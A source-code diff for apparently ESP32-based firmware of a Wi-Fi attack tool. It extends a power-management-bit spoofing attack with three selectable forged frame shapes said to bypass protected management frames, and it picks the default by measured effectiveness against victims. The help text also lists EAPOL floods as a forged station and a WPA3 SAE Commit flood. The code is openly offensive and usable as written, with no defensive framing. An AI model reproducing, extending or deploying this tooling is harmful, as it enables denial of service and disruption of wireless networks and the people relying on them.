@@ -132,10 +132,10 @@ void print_help() {
   Serial.println("INFO EAPOL <idx> [tid|-1] [sta-mac] EAPOL-Start/Logoff flood as a forged station");
   Serial.println("INFO EAPOLSTOP                     stop the EAPOL flood");
   Serial.println("INFO EAPOLTEST                     dump the EAPOL data frames (format check)");
-  Serial.println("INFO PSPOLL <idx> [sta-mac]        PM-bit spoof: forged PM=1 Null Data");
+  Serial.println("INFO PSPOLL <idx> [sta-mac] [null|qosnull|action]  PM-bit spoof frame shape");
   Serial.println("INFO PSPOLLREL                     send PM=0 to every victim, then stop");
   Serial.println("INFO PSPOLLSTOP                    stop the PM-bit spoof");
-  Serial.println("INFO PSPOLLTEST                    dump the PM=1 / PM=0 Null Data bytes");
+  Serial.println("INFO PSPOLLTEST                    dump all three shapes (PM=1 / PM=0)");
   Serial.println("INFO SAE <idx> [point|rand] [gap_ms]  SAE Commit flood (WPA3), echoes anti-clogging token");
   Serial.println("INFO SAESTOP                       stop the SAE flood");
   Serial.println("INFO SAETEST                       dump the SAE Commit bytes (format check)");
@@ -406,6 +406,8 @@ void do_status() {
   Serial.print(pspoll_mode_name());
   Serial.print(" pspf=");
   Serial.print((unsigned)pspoll_frames());
+  Serial.print(" pspfrm=");
+  Serial.print(pspoll_frame_name());
   Serial.print(" pspnul=");
   Serial.print((unsigned)pspoll_null_frames());
   Serial.print(" pspfl=");
@@ -968,30 +970,45 @@ void do_eapol_stop() {
 }
 
 // ---- power-management (PS bit) spoof ----
-// Arguments (order free): the index, and an optional victim MAC. Anything else is
-// rejected: the PS-Poll half of this attack was removed (a unicast control subtype
-// 10 never leaves this MAC), so there is no aid/mode to select any more.
-void do_pspoll(int index, char* first, char* second) {
+// Arguments (order free): the index, an optional victim MAC, and the frame shape
+// (null = Null Data, qosnull = QoS Null, action = vendor-specific Action frame).
+// The shape matters because stacks do not agree on which frame they honour; all
+// three carry the PM bit and all three keep the PMF bypass.
+void do_pspoll(int index, char* first, char* second, char* third) {
   if (index < 0 || index >= g_scan_count) {
     Serial.println("ERR index out of range, run SCAN first");
     return;
   }
   uint8_t sta[6];
   bool have_sta = false;
-  char* tokens[2] = {first, second};
-  for (int i = 0; i < 2; i++) {
+  // QoS Null is the default because it measured strongest on the bench (-38% vs
+  // -30% for plain Null Data and -21% for the Action shape, 测试报告 §4.4.10).
+  pspoll_frame_t shape = PSPOLL_FRAME_QOSNULL;
+  char* tokens[3] = {first, second, third};
+  for (int i = 0; i < 3; i++) {
     char* token = tokens[i];
     if (token == nullptr) continue;
-    if (parse_mac(token, sta)) {
+    if (token_iequals(token, "null")) {
+      shape = PSPOLL_FRAME_NULL;
+    } else if (token_iequals(token, "qosnull") || token_iequals(token, "qos")) {
+      shape = PSPOLL_FRAME_QOSNULL;
+    } else if (token_iequals(token, "action") || token_iequals(token, "act")) {
+      shape = PSPOLL_FRAME_ACTION;
+    } else if (parse_mac(token, sta)) {
+      // Tested before any numeric branch: "02AABBCCDDEE" starts with a digit.
       have_sta = true;
+    } else if (token_iequals(token, "poll") || token_iequals(token, "both")) {
+      Serial.println("ERR poll/both are gone: a unicast PS-Poll never leaves this MAC"
+                     " (CTRLTEST 10 bssid 0xC025 -> 0/10 on the air).");
+      return;
     } else {
-      Serial.printf("ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac])\n",
-                    token);
+      Serial.printf("ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac]"
+                    " [null|qosnull|action])\n", token);
       return;
     }
   }
   attack_stop();
-  if (!pspoll_start(index)) {
+  if (!pspoll_start(index, shape)) {
     Serial.println("ERR cannot start the PM-bit spoof on that network");
     return;
   }
@@ -1002,8 +1019,8 @@ void do_pspoll(int index, char* first, char* second) {
     mac_to_str(sta, sta_text);
   }
   const int32_t chan_err = pspoll_channel_err();
-  Serial.printf("OK PSPOLL %d mode=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
-                pspoll_mode_name(), sta_text[0] ? sta_text : "learned",
+  Serial.printf("OK PSPOLL %d mode=%s frame=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
+                pspoll_mode_name(), pspoll_frame_name(), sta_text[0] ? sta_text : "learned",
                 (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
   if (chan_err != 0) {
     Serial.printf("WARN chset=%d: the channel change was refused (a scan still running?),"
@@ -1018,13 +1035,13 @@ void do_pspoll_stop() {
   const uint32_t flushes = pspoll_flush_frames();
   const uint32_t dl = pspoll_dl_frames();
   pspoll_stop();
-  Serial.printf("OK PSPOLLSTOP frames=%u null=%u flush=%u dl=%u\n", (unsigned)frames,
+  Serial.printf("OK PSPOLLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
                 (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
   ui_log("pm-bit spoof stopped");
 }
 
-// Undo: one PM=0 Null Data per victim, then stop. The AP then hands the frames it
-// has been holding to a station that is still not listening.
+// Undo: one PM=0 frame (same shape) per victim, then stop. The AP then hands the
+// frames it has been holding to a station that is still not listening.
 void do_pspoll_release() {
   const uint32_t clients = pspoll_clients();
   const uint32_t before = pspoll_flush_frames();
@@ -1611,7 +1628,8 @@ void dispatch(char* line) {
     char* idx_token = strtok(nullptr, " \t");
     char* first = strtok(nullptr, " \t");
     char* second = strtok(nullptr, " \t");
-    do_pspoll(parse_index(idx_token), first, second);
+    char* third = strtok(nullptr, " \t");
+    do_pspoll(parse_index(idx_token), first, second, third);
   } else if (strcmp(command, "PSPOLLREL") == 0) {
     do_pspoll_release();
   } else if (strcmp(command, "PSPOLLSTOP") == 0) {
